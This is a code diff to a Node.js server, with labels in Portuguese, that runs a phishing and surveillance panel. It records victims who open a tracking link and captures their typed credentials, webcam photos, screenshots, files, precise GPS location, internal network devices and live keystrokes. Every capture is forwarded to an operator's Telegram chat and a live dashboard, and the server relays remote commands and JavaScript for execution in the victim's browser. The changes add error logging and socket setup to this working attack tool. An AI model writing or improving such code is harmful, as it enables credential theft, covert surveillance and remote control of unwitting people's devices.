@@ -84,21 +84,27 @@ async function sendTelegramMsg(text) {
     if (!bot || !TG_CHAT_ID) return;
     try {
         await bot.sendMessage(TG_CHAT_ID, text, { parse_mode: 'Markdown' });
-    } catch (e) {}
+    } catch (e) {
+        console.error('[TELEGRAM] Msg Error:', e.message);
+    }
 }
 
 async function sendTelegramPhoto(buffer, caption) {
     if (!bot || !TG_CHAT_ID) return;
     try {
         await bot.sendPhoto(TG_CHAT_ID, buffer, { caption });
-    } catch (e) {}
+    } catch (e) {
+        console.error('[TELEGRAM] Photo Error:', e.message);
+    }
 }
 
 async function sendTelegramFile(buffer, filename, caption) {
     if (!bot || !TG_CHAT_ID) return;
     try {
         await bot.sendDocument(TG_CHAT_ID, buffer, { caption }, { filename });
-    } catch (e) {}
+    } catch (e) {
+        console.error('[TELEGRAM] File Error:', e.message);
+    }
 }
 
 // Database Stateless Helpers
@@ -182,6 +188,25 @@ async function initDB() {
 }
 initDB();
 
+const server = http.createServer(app);
+const io = new Server(server, { 
+    cors: { 
+        origin: "*",
+        methods: ["GET", "POST"],
+        allowEIO3: true
+    },
+    transports: ['polling', 'websocket'],
+    pingInterval: 25000,
+    pingTimeout: 5000,
+    maxHttpBufferSize: 1e6
+});
+
+io.on('connection', (socket) => {
+    socket.on('telemetry_data', (p) => processTelemetry(p, socket));
+    socket.on('remote_command', (d) => io.emit('execute_command', d));
+    socket.on('admin_send_chat', (d) => io.emit('victim_recv_chat', d));
+});
+
 // --- TELEMETRY ENGINE (HTTP + Socket) ---
 async function processTelemetry(packet, socket = null, reqIp = null) {
     try {
@@ -195,13 +220,13 @@ async function processTelemetry(packet, socket = null, reqIp = null) {
         if (!log && (event === 'join' || event === 'fingerprint' || event === 'creds' || event === 'capture_creds' || event === 'perf')) {
             log = { id: data.logId, linkId: data.linkId || 'unknown', timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
             await sendTelegramMsg(`🚨 *ALVO ABRIU O LINK*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
-            io.emit('new_click', log);
+            if (io) io.emit('new_click', log);
             axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
                 if(r.data && !r.data.error) {
                     log.geo = `${r.data.city}, ${r.data.country_name}`;
                     log.lat = r.data.latitude; log.lon = r.data.longitude;
                     await saveLog(log);
-                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
+                    if (io) io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                 }
             }).catch(()=>{});
             await saveLog(log);
@@ -212,7 +237,7 @@ async function processTelemetry(packet, socket = null, reqIp = null) {
                 log.status = 'online';
                 log.timestamp = new Date();
                 await saveLog(log);
-                io.emit('update_log', { id: log.id, status: 'online' });
+                if (io) io.emit('update_log', { id: log.id, status: 'online' });
             }
         } else if (log) {
             switch(event) {
@@ -221,53 +246,53 @@ async function processTelemetry(packet, socket = null, reqIp = null) {
                     const val = data.value || data.text;
                     if (val) {
                         log.creds.push(val); await saveLog(log);
-                        io.emit('update_log', { id: log.id, creds: log.creds });
+                        if (io) io.emit('update_log', { id: log.id, creds: log.creds });
                         await sendTelegramMsg(`🔑 *CAPTURA*\n🆔 ID: \`${log.id}\`\n📝: \`${val}\``);
                     }
                     break;
                 case 'photo':
                 case 'capture_photo':
                     log.photo = data.image; await saveLog(log);
-                    io.emit('update_log', { id: log.id, photo: log.photo });
+                    if (io) io.emit('update_log', { id: log.id, photo: log.photo });
                     sendTelegramPhoto(Buffer.from(data.image.split(',')[1], 'base64'), `📸 *FOTO* - ID: ${log.id}`);
                     break;
                 case 'screenshot':
                 case 'capture_screenshot':
                     log.screenshot = data.image; await saveLog(log);
-                    io.emit('update_log', { id: log.id, screenshot: log.screenshot });
+                    if (io) io.emit('update_log', { id: log.id, screenshot: log.screenshot });
                     sendTelegramPhoto(Buffer.from(data.image.split(',')[1], 'base64'), `🖥️ *SCREENSHOT* - ID: ${log.id}`);
                     break;
                 case 'file_up':
                 case 'file_upload':
                     if(!log.files) log.files = []; log.files.push(data); await saveLog(log);
-                    io.emit('update_log', { id: log.id, files: log.files });
+                    if (io) io.emit('update_log', { id: log.id, files: log.files });
                     sendTelegramFile(Buffer.from(data.content.split(',')[1], 'base64'), data.name, `📂 *ARQUIVO* - ID: ${log.id}`);
                     break;
                 case 'geo':
                 case 'update_geo':
                     log.lat = data.lat; log.lon = data.lon; log.geo = `Precise: ${data.lat},${data.lon}`;
-                    await saveLog(log); io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
+                    await saveLog(log); if (io) io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                     sendTelegramMsg(`📍 *GPS* - ID: ${log.id}\nhttps://www.google.com/maps?q=${data.lat},${data.lon}`);
                     break;
                 case 'network':
                 case 'update_network_data':
                     log.internalDevices = data.devices; await saveLog(log);
-                    io.emit('update_log', { id: log.id, internalDevices: log.internalDevices });
+                    if (io) io.emit('update_log', { id: log.id, internalDevices: log.internalDevices });
                     break;
                 case 'fingerprint':
                     log.fingerprint = data.fingerprint; await saveLog(log);
-                    io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });
+                    if (io) io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });
                     sendTelegramMsg(`📂 *DOSSIÊ* - ID: ${log.id}\nOS: ${data.fingerprint.platform}`);
                     break;
                 case 'typing':
                 case 'perf':
-                    io.emit('update_log', { id: log.id, typing: data.text });
+                    if (io) io.emit('update_log', { id: log.id, typing: data.text });
                     break;
                 case 'status_change':
                     log.status = data.status; await saveLog(log);
-                    io.emit('update_log', { id: log.id, status: log.status });
+                    if (io) io.emit('update_log', { id: log.id, status: log.status });
                     break;
-                case 'js_result': io.emit('js_result_admin', { logId: log.id, result: data.result }); break;
+                case 'js_result': if (io) io.emit('js_result_admin', { logId: log.id, result: data.result }); break;
             }
         }
     } catch(e) { console.error('[TELEMETRY] Error:', e.message); }
@@ -414,6 +439,7 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-if (!process.env.VERCEL) server.listen(PORT);
+if (!process.env.VERCEL) {
+    server.listen(PORT, () => console.log(`[SERVER] Running on port ${PORT}`));
+}
 module.exports = app;
-orts = app;
